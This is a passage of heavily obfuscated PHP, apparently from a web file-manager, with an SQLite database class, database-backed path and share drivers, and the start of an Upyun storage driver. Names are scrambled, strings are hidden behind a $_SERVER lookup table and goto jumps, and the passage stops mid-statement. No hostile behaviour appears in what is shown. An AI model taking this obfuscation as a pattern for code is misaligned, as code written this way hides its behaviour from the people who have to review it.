$Â‚·è÷ =& $_SERVER[ •ŒÓîÆ]; $‘Š¹–âã = $Â‚·è÷[12]; if (!empty($ƒ‰º×Œ)) { $ƒ‰º×Œ = explode($Â‚·è÷[50], $ƒ‰º×Œ); if (count($ƒ‰º×Œ) > 1) { $‘Š¹–âã .= $Â‚·è÷[51] . $ƒ‰º×Œ[1] . $Â‚·è÷[52] . $ƒ‰º×Œ[0] . $Â‚·è÷[53]; } else { $‘Š¹–âã .= $Â‚·è÷[51] . $ƒ‰º×Œ[0] . $Â‚·è÷[53]; } } return $‘Š¹–âã; } } class DbSqlite3Base extends Db { public function __construct($çƒâô€ = '') { $ĞüÑÚÆë =& $_SERVER[ •ŒÓîÆ]; if (!class_exists($ĞüÑÚÆë[54])) { think_exception(think_lang($ĞüÑÚÆë[14]) . $ĞüÑÚÆë[55]); } if (!empty($çƒâô€)) { if (!isset($çƒâô€[$ĞüÑÚÆë[16]])) { $çƒâô€[$ĞüÑÚÆë[16]] = 438; } $this->config = $çƒâô€; if (empty($this->config[$ĞüÑÚÆë[17]])) { $this->config[$ĞüÑÚÆë[17]] = array(); } } } public function connect($ö×óı¸½ = '', $‹€¾æ‡ = 0) { $€Á‹çã =& $_SERVER[ •ŒÓîÆ]; if (!isset($this->linkID[$‹€¾æ‡])) { if (empty($ö×óı¸½)) { $ö×óı¸½ = $this->config; } $this->linkID[$‹€¾æ‡] = new SQLite3($ö×óı¸½[$€Á‹çã[21]]); if (!$this->linkID[$‹€¾æ‡]) { think_exception($this->linkID[$‹€¾æ‡]->lastErrorMsg()); } $this->connected = !0; @$this->linkID[$‹€¾æ‡]->busyTimeout(30000); if (1 != think_config($€Á‹çã[22])) { unset($this->config); } } return $this->linkID[$‹€¾æ‡]; } public function free() { $this->queryID = null; } public function query($€¢¯×—) { $æ¹ÉšÀˆ =& $_SERVER[ •ŒÓîÆ]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $€¢¯×—; if ($this->queryID) { $this->free(); } think_action_status($æ¹ÉšÀˆ[23], 1); think_status($æ¹ÉšÀˆ[24]); $this->queryID = $this->_linkID->query($€¢¯×—); $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $Å•¶ÚÆ = $this->getAll(); $this->numRows = count($Å•¶ÚÆ); return $Å•¶ÚÆ; } } public function execute($€ÈàØ) { $”‘À¹ä =& $_SERVER[ •ŒÓîÆ]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $€ÈàØ; if ($this->queryID) { $this->free(); } think_action_status($”‘À¹ä[25], 1); think_status($”‘À¹ä[24]); $®Ó„ü†´ = $this->_linkID->exec($€ÈàØ); $this->debug(); if (!1 === $®Ó„ü†´) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->changes(); $this->lastInsID = $this->_linkID->lastInsertRowID(); return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->query($_SERVER[ •ŒÓîÆ][26]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $í’Ö‡Ò¼ = $this->_linkID->query($_SERVER[ •ŒÓîÆ][27]); if (!$í’Ö‡Ò¼) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $”„î˜›Ô = $this->_linkID->query($_SERVER[ •ŒÓîÆ][28]); if (!$”„î˜›Ô) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $¢‹åó× = array(); while ($š©ö°€‘ = $this->queryID->fetchArray(SQLITE3_ASSOC)) { $¢‹åó×[] = $š©ö°€‘; } $this->queryID->reset(); return $¢‹åó×; } public function getFields($æáû¯) { $Ş±ĞÆ¬è =& $_SERVER[ •ŒÓîÆ]; $Û—‰ãà = $this->query($Ş±ĞÆ¬è[29] . $æáû¯ . $Ş±ĞÆ¬è[30]); $ë¾ÒÚ×é = array(); if ($Û—‰ãà) { foreach ($Û—‰ãà as $¡£ÔİÖ† => $òù„óåå) { $ë¾ÒÚ×é[$òù„óåå[$Ş±ĞÆ¬è[32]]] = array($Ş±ĞÆ¬è[32] => $òù„óåå[$Ş±ĞÆ¬è[32]], $Ş±ĞÆ¬è[33] => $òù„óåå[$Ş±ĞÆ¬è[33]], $Ş±ĞÆ¬è[35] => (bool) ($òù„óåå[$Ş±ĞÆ¬è[35]] === $Ş±ĞÆ¬è[12]), $Ş±ĞÆ¬è[37] => $òù„óåå[$Ş±ĞÆ¬è[56]], $Ş±ĞÆ¬è[39] => (bool) $òù„óåå[$Ş±ĞÆ¬è[57]], $Ş±ĞÆ¬è[42] => (bool) $òù„óåå[$Ş±ĞÆ¬è[57]]); } } return $ë¾ÒÚ×é; } public function getTables($ëŞæô´ = '') { $ë§ßúÂã =& $_SERVER[ •ŒÓîÆ]; $°í´ş»ñ = $this->query($ë§ßúÂã[45] . $ë§ßúÂã[46] . $ë§ßúÂã[47]); $ôËÊˆ = array(); foreach ($°í´ş»ñ as $Ô´ì€ŸĞ => $å¡ãú) { $ôËÊˆ[$Ô´ì€ŸĞ] = current($å¡ãú); } return $ôËÊˆ; } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $÷íüî¸­ =& $_SERVER[ •ŒÓîÆ]; $this->error = $this->_linkID->lastErrorMsg(); if ($÷íüî¸­[12] != $this->queryStr) { $this->error .= LNG($÷íüî¸­[48]) . $this->queryStr; } think_trace($this->error, $÷íüî¸­[12], $÷íüî¸­[49]); return $this->error; } public function escapeString($ÇÆêÖã) { $©»©ıàÆ =& $_SERVER[ •ŒÓîÆ]; if ($this->_linkID) { return $this->_linkID->escapeString($ÇÆêÖã); } return str_ireplace($©»©ıàÆ[58], $©»©ıàÆ[59], $ÇÆêÖã); } public function parseLimit($³à¯ñ‡Ü) { $°´ª´Ì =& $_SERVER[ •ŒÓîÆ]; $²™Û‘¤ı = $°´ª´Ì[12]; if (!empty($³à¯ñ‡Ü)) { $³à¯ñ‡Ü = explode($°´ª´Ì[50], $³à¯ñ‡Ü); if (count($³à¯ñ‡Ü) > 1) { $²™Û‘¤ı .= $°´ª´Ì[51] . $³à¯ñ‡Ü[1] . $°´ª´Ì[52] . $³à¯ñ‡Ü[0] . $°´ª´Ì[53]; } else { $²™Û‘¤ı .= $°´ª´Ì[51] . $³à¯ñ‡Ü[0] . $°´ª´Ì[53]; } } return $²™Û‘¤ı; } } goto FæäÛ‰²À; bÔ Ë: class PathDriverDB extends PathDriverBase { public $model; public $pathParse; public function __construct($åíÏËæÎ) { $this->pathParse = $åíÏËæÎ; $this->model = Model($_SERVER[ •ŒÓîÆ][1374]); } public function getPath($šùÉÙ¬Ú) { return trim($šùÉÙ¬Ú, $_SERVER[ •ŒÓîÆ][8]); } public function pathFather($§ÙÈÊƒé) { $ºÛ¨‹øÆ = $this->parse($§ÙÈÊƒé); $ºÛ¨‹øÆ = $this->infoSimple($§ÙÈÊƒé); return $ºÛ¨‹øÆ ? $ºÛ¨‹øÆ[$_SERVER[ •ŒÓîÆ][182]] : !1; } public function pathThis($ıØÑöñ—) { $›â»ãó = $this->infoSimple($ıØÑöñ—); return $›â»ãó ? $›â»ãó[$_SERVER[ •ŒÓîÆ][32]] : !1; } public function getPathOuter($¢´ÏÁè») { if (!$¢´ÏÁè») { return $¢´ÏÁè»; } $Ó¤Ôğ”· = $this->parse($¢´ÏÁè»); return KodIO::make($Ó¤Ôğ”·[$_SERVER[ •ŒÓîÆ][453]]); } public function copyFolderFromIO($ÀÃÚ¶Ïş, $¬Ğ°˜ü‹, $Æå“ò, $ÃÜı‰‘è, $—ô£Ú›) { $½×Ã®•‚ = $this->model->copyFolderFromIO($ÀÃÚ¶Ïş, $¬Ğ°˜ü‹, $Æå“ò, $ÃÜı‰‘è, $—ô£Ú›); return KodIO::make($½×Ã®•‚); } public function isParentOf($ùÕò³ÜŞ, $Ÿ‚ÊïØÑ) { return $this->model->isParentOf($ùÕò³ÜŞ, $Ÿ‚ÊïØÑ); } public function mkfile($ä‰šó‰¿, $¨Ãâƒ›˜ = '', $ùßÏ”øÉ = REPEAT_RENAME) { $‡ç‘Ò =& $_SERVER[ •ŒÓîÆ]; $š¢Ğ€Å¿ = $this->parse($ä‰šó‰¿); $ä‰šó‰¿ = $š¢Ğ€Å¿[$‡ç‘Ò[453]]; for ($éì—„•¾ = 0; $éì—„•¾ < count($š¢Ğ€Å¿[$‡ç‘Ò[1375]]); $éì—„•¾++) { $’ ¥Ü€ò = $š¢Ğ€Å¿[$‡ç‘Ò[1375]][$éì—„•¾]; if ($éì—„•¾ == count($š¢Ğ€Å¿[$‡ç‘Ò[1375]]) - 1) { $ä‰šó‰¿ = $this->model->mkfile($ä‰šó‰¿, $’ ¥Ü€ò, $¨Ãâƒ›˜, $ùßÏ”øÉ); break; } $ä‰šó‰¿ = $this->model->mkdir($ä‰šó‰¿, $’ ¥Ü€ò, REPEAT_SKIP); } return $this->getPathOuter($ä‰šó‰¿); } public function mkdir($Íí¶‘É£, $»«âàâ = REPEAT_SKIP) { $ë…ğşÇ‰ =& $_SERVER[ •ŒÓîÆ]; $ĞÌëË„Ø = $this->parse($Íí¶‘É£); $Íí¶‘É£ = $ĞÌëË„Ø[$ë…ğşÇ‰[453]]; for ($ñÜ»Ø™– = 0; $ñÜ»Ø™– < count($ĞÌëË„Ø[$ë…ğşÇ‰[1375]]); $ñÜ»Ø™–++) { $ëøÜ¥¸ı = $ĞÌëË„Ø[$ë…ğşÇ‰[1375]][$ñÜ»Ø™–]; $Íí¶‘É£ = $this->model->mkdir($Íí¶‘É£, $ëøÜ¥¸ı, $»«âàâ); } return $this->getPathOuter($Íí¶‘É£); } public function copyFile($”•¡±ö, $ë‡”˜¨…, $éÙçÌ”ß = REPEAT_REPLACE) { $èò˜ Ô– =& $_SERVER[ •ŒÓîÆ]; $îòº¯É¨ = $this->parse($ë‡”˜¨…); $­«¨âØÀ = $this->model->copy($”•¡±ö, $îòº¯É¨[$èò˜ Ô–[453]], $éÙçÌ”ß, $îòº¯É¨[$èò˜ Ô–[86]]); return $­«¨âØÀ ? $this->getPathOuter($­«¨âØÀ) : !1; } public function moveFile($±ùƒéû , $ÑÓã¢á¸, $ğ„îç»Â = REPEAT_REPLACE) { $ˆÓî¥Ç½ =& $_SERVER[ •ŒÓîÆ]; $¡·öÅÇ = $this->parse($ÑÓã¢á¸); $ÈúçÙ¶¯ = $this->model->move($±ùƒéû , $¡·öÅÇ[$ˆÓî¥Ç½[453]], $ğ„îç»Â, $¡·öÅÇ[$ˆÓî¥Ç½[86]]); return $ÈúçÙ¶¯ ? $this->getPathOuter($ÈúçÙ¶¯) : !1; } public function copy($âá¦”›, $øŞø¤ÛÁ, $®ı³æ“¸ = REPEAT_REPLACE, $Õ¹“â‡ú = false) { $œ¼¯¥º = $this->parse($øŞø¤ÛÁ); $¿­×µªÖ = $this->model->copy($âá¦”›, $œ¼¯¥º[$_SERVER[ •ŒÓîÆ][453]], $®ı³æ“¸, $Õ¹“â‡ú); return $¿­×µªÖ ? $this->getPathOuter($¿­×µªÖ) : !1; } public function moveSameAllow() { } public function move($Ú°¡ôÏ, $¯îëÓ, $äÎÃô§ñ = REPEAT_REPLACE, $Ã›Ï§‚ = false) { $ê»”šŒç = $this->parse($¯îëÓ); $«ĞÈ¼¦ = $this->model->move($Ú°¡ôÏ, $ê»”šŒç[$_SERVER[ •ŒÓîÆ][453]], $äÎÃô§ñ, $Ã›Ï§‚); return $«ĞÈ¼¦ ? $this->getPathOuter($«ĞÈ¼¦) : !1; } public function remove($š—¿÷«, $»‚Ÿ»º = true) { return $this->model->remove($š—¿÷«, $»‚Ÿ»º); } public function rename($À»°ºŒ, $€ÂÕÁ¾) { $Ó•ÀÃäì = $this->model->rename($À»°ºŒ, $€ÂÕÁ¾); return $Ó•ÀÃäì ? $this->getPathOuter($À»°ºŒ) : $Ó•ÀÃäì; } public function size($äç›®øü) { $êÛäæ™ = $this->infoSimple($äç›®øü); return $êÛäæ™ ? $êÛäæ™[$_SERVER[ •ŒÓîÆ][78]] : 0; } public function infoSimple($¦œÜÑÊî) { return $this->model->sourceInfo($¦œÜÑÊî); } public function info($±Åó´­Ó) { return $this->infoParse($±Åó´­Ó); } public function infoAuth($«œÆ¶å«) { return $this->infoParse($«œÆ¶å«, !1, !0); } public function infoWithChildren($¥”ú£Å¯) { return $this->infoParse($¥”ú£Å¯, !0); } protected function infoParse($àë²Ë˜, $ Şì¹â = false, $æœĞÜó  = false) { if (!$ Şì¹â) { return $this->model->pathInfo($àë²Ë˜, $æœĞÜó ); } return $this->model->pathInfoMore($àë²Ë˜); } public function infoFullSimple($¨”œĞ²ä) { $Äé–¯äÙ =& $_SERVER[ •ŒÓîÆ]; $İĞÕóñò = explode($Äé–¯äÙ[8], $¨”œĞ²ä); $ÀñÒÕ¤ß = implode($Äé–¯äÙ[8], array_splice($İĞÕóñò, 1)); return $this->model->pathInfoByPath($İĞÕóñò[0], $ÀñÒÕ¤ß); } public function infoFull($›îßÓğ) { $ş½ö¾áŞ = $this->infoFullSimple($›îßÓğ); return is_array($ş½ö¾áŞ) ? $this->model->pathInfo($ş½ö¾áŞ[$_SERVER[ •ŒÓîÆ][183]]) : !1; } public function hashSimple($¬†÷¡·™) { $´ÒÜŒ ™ =& $_SERVER[ •ŒÓîÆ]; $à‹¿ÏŸ€ = $this->infoWithChildren($¬†÷¡·™); return $à‹¿ÏŸ€[$´ÒÜŒ ™[528]][$´ÒÜŒ ™[652]]; } public function hashMd5($Û½´äƒ) { $Ÿó‘ş¬É =& $_SERVER[ •ŒÓîÆ]; $¼ì«öæì = $this->infoWithChildren($Û½´äƒ); return $¼ì«öæì[$Ÿó‘ş¬É[528]][$Ÿó‘ş¬É[526]]; } public function exist($åğ™À©õ) { $íÑˆ´Ò‚ =& $_SERVER[ •ŒÓîÆ]; $ÇĞ­ñü = $this->parse($åğ™À©õ); if (!$ÇĞ­ñü[$íÑˆ´Ò‚[86]]) { return $this->isFile($åğ™À©õ) || $this->isFolder($åğ™À©õ); } $î¸Ó‘…³ = array($íÑˆ´Ò‚[456] => $ÇĞ­ñü[$íÑˆ´Ò‚[453]], $íÑˆ´Ò‚[32] => $ÇĞ­ñü[$íÑˆ´Ò‚[86]]); $‚˜Ìˆ„ = $this->model->where($î¸Ó‘…³)->find(); return $‚˜Ìˆ„ ? !0 : !1; } public function isFile($æÚ¸¸‘÷) { $®ã•«Õ÷ =& $_SERVER[ •ŒÓîÆ]; $ÊªŞé™ò = $this->infoSimple($æÚ¸¸‘÷); return $ÊªŞé™ò && $ÊªŞé™ò[$®ã•«Õ÷[464]] == $®ã•«Õ÷[214] ? !0 : !1; } public function isFolder($ïËú•Ğø) { $Ãí£œ¤¥ =& $_SERVER[ •ŒÓîÆ]; $‹Ò’ÅƒÆ = $this->infoSimple($ïËú•Ğø); return $‹Ò’ÅƒÆ && $‹Ò’ÅƒÆ[$Ãí£œ¤¥[464]] == $Ãí£œ¤¥[90] ? !0 : !1; } public function listPath($ç˜Ú’œí, $€ÇÆÒ = false) { $°¯–ÚÅ­ =& $_SERVER[ •ŒÓîÆ]; if ($ç˜Ú’œí == $°¯–ÚÅ­[12]) { return !1; } $†Å²¯ğÎ = array($°¯–ÚÅ­[456] => $ç˜Ú’œí); if ($€ÇÆÒ) { return $this->model->listSource($†Å²¯ğÎ, -1); } return $this->model->listSource($†Å²¯ğÎ); } public function has($‡¡©¦ú¨, $ÚØ³”ıŒ = false, $ß×Ô¼Ù = null) { $øŠ…÷‚¢ =& $_SERVER[ •ŒÓîÆ]; $—úÁô´Ë = $this->infoWithChildren($‡¡©¦ú¨); if ($ÚØ³”ıŒ) { return array($øŠ…÷‚¢[226] => $—úÁô´Ë[$øŠ…÷‚¢[226]], $øŠ…÷‚¢[225] => $—úÁô´Ë[$øŠ…÷‚¢[225]]); } return $ß×Ô¼Ù ? $—úÁô´Ë[$øŠ…÷‚¢[226]] : $—úÁô´Ë[$øŠ…÷‚¢[225]]; } public function listAll($Ù§Çç™) { $•×šÕÎ = IO::info($this->pathParse[$_SERVER[ •ŒÓîÆ][86]]); if (!$•×šÕÎ) { return array(); } return $this->model->listAll($Ù§Çç™); } public function getContent($´à‚ÆÑ¾) { return $this->model->getContent($´à‚ÆÑ¾); } public function setContent($ñšÎÂÌı, $ ¤ƒãã = '') { return $this->model->setContent($ñšÎÂÌı, $ ¤ƒãã); } public function fileSubstr($Ï™«ö™¡, $â­õïÇ, $ÑÑÈèû¯) { return $this->model->fileSubstr($Ï™«ö™¡, $â­õïÇ, $ÑÑÈèû¯); } public function download($øîªóÆ†, $ÀòıÂÍê = '') { $ªŒ©¥†³ = get_path_father($ÀòıÂÍê); $àëƒìİÏ = get_path_this($ÀòıÂÍê); $µƒ’ØŒ = $this->model->fileInfoGet($øîªóÆ†); $í²ùìê… = IO::copy($µƒ’ØŒ[$_SERVER[ •ŒÓîÆ][86]], $ªŒ©¥†³, !1, $àëƒìİÏ); return $í²ùìê…; } public function setModifyTime($Ã¯ö÷ø…, $—¯ú™ = '') { $òéË‡ï› =& $_SERVER[ •ŒÓîÆ]; if (!$Ã¯ö÷ø…) { return; } $this->model->where(array($òéË‡ï›[470] => $Ã¯ö÷ø…))->save(array($òéË‡ï›[87] => $—¯ú™)); } public function upload($áô´ÙÃ÷, $ÄúÕíÙÉ, $¾ôä€ëú = false, $£ã†Ö£Ş = REPEAT_REPLACE) { $¬À¥Ì×é =& $_SERVER[ •ŒÓîÆ]; $›µ¿‡ø³ = $this->parse($áô´ÙÃ÷); $ÌÑšÍÏ‹ = $this->model->addFile($›µ¿‡ø³[$¬À¥Ì×é[453]], $ÄúÕíÙÉ, $›µ¿‡ø³[$¬À¥Ì×é[86]], $¾ôä€ëú, $£ã†Ö£Ş); return $this->getPathOuter($ÌÑšÍÏ‹); } public function uploadFileByID($ˆÄÁÂÑ, $×Ò­ÇÖÒ, $ù³¡ıÉê) { $§ÌÕšóå =& $_SERVER[ •ŒÓîÆ]; $¦Àµ¿‰ƒ = $this->parse($ˆÄÁÂÑ); $‡È©Ç¶ø = $this->model->addFileByFileID($¦Àµ¿‰ƒ[$§ÌÕšóå[453]], $×Ò­ÇÖÒ, $¦Àµ¿‰ƒ[$§ÌÕšóå[86]], $ù³¡ıÉê); return $this->getPathOuter($‡È©Ç¶ø); } public function addFileByRemote($¢¿Ë¤„—, $ÜôË¿ÜÒ, $Ë›ªúçŸ = array(), $‚Üµı³£ = '', $¹€ÅÜòá) { $ì°Ìº™« =& $_SERVER[ •ŒÓîÆ]; $ûÅ¹¥à¥ = $this->parse($¢¿Ë¤„—); $‚Üµı³£ = empty($‚Üµı³£) ? $ûÅ¹¥à¥[$ì°Ìº™«[86]] : $‚Üµı³£; $íò¡ßÇ¾ = $this->model->addFileByRemote($ûÅ¹¥à¥[$ì°Ìº™«[453]], $ÜôË¿ÜÒ, $‚Üµı³£, $Ë›ªúçŸ, $¹€ÅÜòá); return $this->getPathOuter($íò¡ßÇ¾); } public function uploadLink($Ú¬Ú‹š€, $¤õŠ§ê¸ = 0) { $­•¿°¥ =& $_SERVER[ •ŒÓîÆ]; $¿»§²É = $this->parse($Ú¬Ú‹š€); $ÛáË®á = _get($GLOBALS[$­•¿°¥[7]], $­•¿°¥[1376]); $ŠÏÌÂÇÙ = _get($GLOBALS[$­•¿°¥[7]], $­•¿°¥[1377]); $Ú¬Ú‹š€ = Model($­•¿°¥[654])->createFileName($¿»§²É[$­•¿°¥[86]], $ÛáË®á, $ŠÏÌÂÇÙ); return IO::uploadLink($Ú¬Ú‹š€, $¤õŠ§ê¸); } public function fileNameAuto($“šôÈì, $ô¶üĞğÕ, $¼¢†Èº« = REPEAT_REPLACE, $«¥Êƒİñ = false) { return $this->model->fileNameAuto($“šôÈì, $ô¶üĞğÕ, $¼¢†Èº«, $«¥Êƒİñ); } public function fileNameExist($‡ŞÈ¤ĞÕ, $¶²ÄÆš–) { return $this->model->fileNameExist($‡ŞÈ¤ĞÕ, $¶²ÄÆš–); } protected function _fileOut($ñ¥ÊÄ›œ, $÷‘Ø§³Ï = false, $«÷©îÃÓ = false, $øÓö›ôÄ = '', $›ú‡Æ±š = false) { $Ğó™Şü† =& $_SERVER[ •ŒÓîÆ]; $Ï™ˆÜ„Â = $this->model->sourceInfo($ñ¥ÊÄ›œ); if ($Ï™ˆÜ„Â[$Ğó™Şü†[464]] == $Ğó™Şü†[90]) { header($Ğó™Şü†[1378]); die; } $½ÏŞÂ§î = $this->model->fileInfoGet($ñ¥ÊÄ›œ); $øÓö›ôÄ = $½ÏŞÂ§î[$Ğó™Şü†[526]] ? $½ÏŞÂ§î[$Ğó™Şü†[526]] : $øÓö›ôÄ; $ä®ÇÚ°˜ = is_array($GLOBALS[$Ğó™Şü†[171]]) ? $GLOBALS[$Ğó™Şü†[171]][$Ğó™Şü†[32]] : $Ï™ˆÜ„Â[$Ğó™Şü†[32]]; if ($›ú‡Æ±š) { return IO::fileOutServer($½ÏŞÂ§î[$Ğó™Şü†[86]], $÷‘Ø§³Ï, $ä®ÇÚ°˜, $øÓö›ôÄ); } IO::fileOut($½ÏŞÂ§î[$Ğó™Şü†[86]], $÷‘Ø§³Ï, $ä®ÇÚ°˜, $øÓö›ôÄ); } public function fileOut($üÇŸ‰×, $Ú’âŸ¶· = false, $õ´¿©˜Ÿ = false, $ÅŸÑ³´ = '') { $this->_fileOut($üÇŸ‰×, $Ú’âŸ¶·, $õ´¿©˜Ÿ, $ÅŸÑ³´); } public function fileOutServer($…û”«õÕ, $ôÃğ¬À™ = false, $ƒ®Ã¤ = false, $òëïòÚ² = '') { $this->_fileOut($…û”«õÕ, $ôÃğ¬À™, $ƒ®Ã¤, $òëïòÚ², !0); } protected function _fileOutImage($àÊ˜©¥˜, $¦Ãí»ü = 250) { $øüŸË›ñ =& $_SERVER[ •ŒÓîÆ]; $õÃüõŒ¯ = $this->model->pathInfo($àÊ˜©¥˜); if ($õÃüõŒ¯[$øüŸË›ñ[464]] == $øüŸË›ñ[90]) { show_json($øüŸË›ñ[1379] . $àÊ˜©¥˜, !1); } $“ŒúØáÊ = $this->model->fileInfoGet($àÊ˜©¥˜); $õÃüõŒ¯[$øüŸË›ñ[172]] = $“ŒúØáÊ[$øüŸË›ñ[86]]; $GLOBALS[$øüŸË›ñ[171]] = $õÃüõŒ¯; IO::fileOutImage($“ŒúØáÊ[$øüŸË›ñ[86]], $¦Ãí»ü); } public function fileOutImage($¶ƒ™ØôÀ, $ÒÌÁÀÈú = 250) { $this->_fileOutImage($¶ƒ™ØôÀ, $ÒÌÁÀÈú); } public function fileOutImageServer($ÄÄ˜®, $¾±¡æ¹ö = 250) { $this->_fileOutImage($ÄÄ˜®, $¾±¡æ¹ö); } public function link($£šÛÜõä, $Ğø˜”÷Ò = '') { $£¸ † = $this->model->fileInfoGet($£šÛÜõä); return IO::link($£¸ †[$_SERVER[ •ŒÓîÆ][86]], $Ğø˜”÷Ò); } protected function parse($ˆ¶³¡‘‹) { $òğ¨¹ =& $_SERVER[ •ŒÓîÆ]; if (strstr($ˆ¶³¡‘‹, $òğ¨¹[8]) === !1) { return array($òğ¨¹[472] => intval($ˆ¶³¡‘‹), $òğ¨¹[86] => $òğ¨¹[12], $òğ¨¹[1375] => array()); } $•ÕÏÌÇ¡ = explode($òğ¨¹[8], trim($ˆ¶³¡‘‹, $òğ¨¹[8])); if (count($•ÕÏÌÇ¡) < 2) { show_tips(clear_html($ˆ¶³¡‘‹) . $òğ¨¹[1380]); } return array($òğ¨¹[472] => intval($•ÕÏÌÇ¡[0]), $òğ¨¹[86] => $•ÕÏÌÇ¡[1], $òğ¨¹[1375] => array_slice($•ÕÏÌÇ¡, 1)); } } class PathDriverDbShareItem extends PathDriverDB { public function __construct($Ñ§ÔÏŒ») { $this->pathParse = $Ñ§ÔÏŒ»; $this->model = Model($_SERVER[ •ŒÓîÆ][1374]); } public function getPathOuter($©ò“îï™) { $ÄÙÛ×Û¸ =& $_SERVER[ •ŒÓîÆ]; if (!$©ò“îï™) { return $©ò“îï™; } $ÃÖ™œñ = $this->parse($©ò“îï™); return trim(KodIO::makeShare($this->pathParse[$ÄÙÛ×Û¸[453]], $ÃÖ™œñ[$ÄÙÛ×Û¸[453]]), $ÄÙÛ×Û¸[8]); } protected function infoParse($Ü´…­„, $·Üû¶‚Ğ = false, $ŸîÖÃ¶² = false) { $«Ï®Ã—ñ =& $_SERVER[ •ŒÓîÆ]; $ÒŞ³Œˆò = $this->pathParse[$«Ï®Ã—ñ[453]]; $½çïüè = trim($this->pathParse[$«Ï®Ã—ñ[1209]], $«Ï®Ã—ñ[8]); return Action($«Ï®Ã—ñ[1381])->sharePathInfo($ÒŞ³Œˆò, $½çïüè, $·Üû¶‚Ğ); } public function infoFull($…†çê‡°) { $İòÈ×Œ§ =& $_SERVER[ •ŒÓîÆ]; $Èª˜àÙı = explode($İòÈ×Œ§[8], trim($…†çê‡°, $İòÈ×Œ§[8])); if (count($Èª˜àÙı) > 1) { $ıØ—†‘à = implode($İòÈ×Œ§[8], array_splice($Èª˜àÙı, 1)); $æ³İÖÜê = $this->model->pathInfoByPath($Èª˜àÙı[0], $ıØ—†‘à); if (!$æ³İÖÜê) { return !1; } $this->pathParse[$İòÈ×Œ§[1209]] = $æ³İÖÜê[$İòÈ×Œ§[183]]; } return $this->infoParse($…†çê‡°); } public function listAll($†ÛÚ¿æä) { $ èÀ¯‡† =& $_SERVER[ •ŒÓîÆ]; $—Œ´ï = IO::info($this->pathParse[$ èÀ¯‡†[86]]); if (!$—Œ´ï) { return array(); } $šı“²‘É = $this->model->listAll($†ÛÚ¿æä); $öÉãÓ‘Ğ = Model($ èÀ¯‡†[644])->getInfo($—Œ´ï[$ èÀ¯‡†[645]]); foreach ($šı“²‘É as &$½ñ¨óÕ) { check_abort(); $½ñ¨óÕ[$ èÀ¯‡†[89]] = Action($ èÀ¯‡†[1381])->_shareItemeParse($½ñ¨óÕ[$ èÀ¯‡†[89]], $öÉãÓ‘Ğ); } unset($½ñ¨óÕ); return $šı“²‘É; } } class PathDriverDbShareLink extends PathDriverDB { public function __construct($Â¦ØîºÑ) { $this->pathParse = $Â¦ØîºÑ; $this->model = Model($_SERVER[ •ŒÓîÆ][1374]); } protected function infoParse($¨ã‰’”„, $öÇÅ‹¼è = false, $ÈòïÔØ— = false) { $»©öè†ü =& $_SERVER[ •ŒÓîÆ]; return Action($»©öè†ü[1215])->sharePathInfo($this->pathParse[$»©öè†ü[86]], !0, $öÇÅ‹¼è); } public function listPath($Ç¬ ùƒï, $ÒÓòÉ’  = false) { $ç›Äê†ó =& $_SERVER[ •ŒÓîÆ]; $ŞŞ©õÊ¢ = parent::listPath($Ç¬ ùƒï, $ÒÓòÉ’ ); if (!$ŞŞ©õÊ¢) { return $ŞŞ©õÊ¢; } if (is_array($ŞŞ©õÊ¢[$ç›Äê†ó[1382]])) { $ŞŞ©õÊ¢[$ç›Äê†ó[1382]] = Action($ç›Äê†ó[1215])->shareItemInfo($ŞŞ©õÊ¢[$ç›Äê†ó[1382]]); } foreach ($ŞŞ©õÊ¢ as $¿êÏÎô™ => $è·Âèß´) { if (!in_array($¿êÏÎô™, array($ç›Äê†ó[85], $ç›Äê†ó[84]))) { continue; } foreach ($è·Âèß´ as $Ÿõ¨à => $çû®Ùòî) { $ŞŞ©õÊ¢[$¿êÏÎô™][$Ÿõ¨à] = Action($ç›Äê†ó[1215])->shareItemInfo($çû®Ùòî); } } return $ŞŞ©õÊ¢; } public function listAll($ ¡»½’µ) { $àÖ­¨ä« =& $_SERVER[ •ŒÓîÆ]; $¹ä±¬•¤ = IO::info($this->pathParse[$àÖ­¨ä«[86]]); if (!$¹ä±¬•¤) { return array(); } $¤´–›Ş = $this->model->listAll($ ¡»½’µ); foreach ($¤´–›Ş as &$ñ»Â°À) { $ñ»Â°À[$àÖ­¨ä«[89]] = Action($àÖ­¨ä«[1215])->shareItemInfo($ñ»Â°À[$àÖ­¨ä«[89]]); } unset($ñ»Â°À); return $¤´–›Ş; } } goto F†Ì—åêÄß; cçÙÌ¼ååÃ: class PathDriverUSS extends PathDriverBase { protected $bucket = ''; protected $username = ''; protected $userpass = ''; protected $domain = ''; protected $token = ''; protected $endpoint = "\150\164\164\160\x3a\x2f\x2f\166\60\x2e\x61\160\151\x2e\x75\x70\171\165\156\56\143\x6f\x6d"; public $ioUploadServer = 0; public $ioFileOutServer = 0; public function __construct($©ŠıÜ¡Ä) { parent::__construct(); $this->_init($©ŠıÜ¡Ä); } public function _init($¥òÉø·ß) { $ŒŸâ« =& $_SERVER[ •ŒÓîÆ]; foreach ($¥òÉø·ß as $¶»¹²³Ü => $†ëÇ¨éô) { if (isset($this->{$¶»¹²³Ü})) { $this->{$¶»¹²³Ü} = $†ëÇ¨éô; } } if (empty($this->username) || empty($this->userpass) || empty($this->domain)) { throw new Exception($ŒŸâ«[1482] . LNG($ŒŸâ«[1414])); } } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } private function ussHeaders($ñ°­ÏØÔ, $•ö×ªş¶ = "\x47\105\x54") { $üì„†æ =& $_SERVER[ •ŒÓîÆ]; $÷ëåÊ¶Ø = gmdate($üì„†æ[1447]); $óåÙœ±è = base64_encode(hash_hmac($üì„†æ[1483], "{$•ö×ªş¶}\x26{$ñ°­ÏØÔ}\x26{$÷ëåÊ¶Ø}", md5("{$this->userpass}"), !0)); $à©âç‹« = array("\101\x75\x74\150\157\x72\x69\172\141\164\151\x6f\156\72\x55\120\x59\x55\x4e\40{$this->username}\x3a{$óåÙœ±è}", 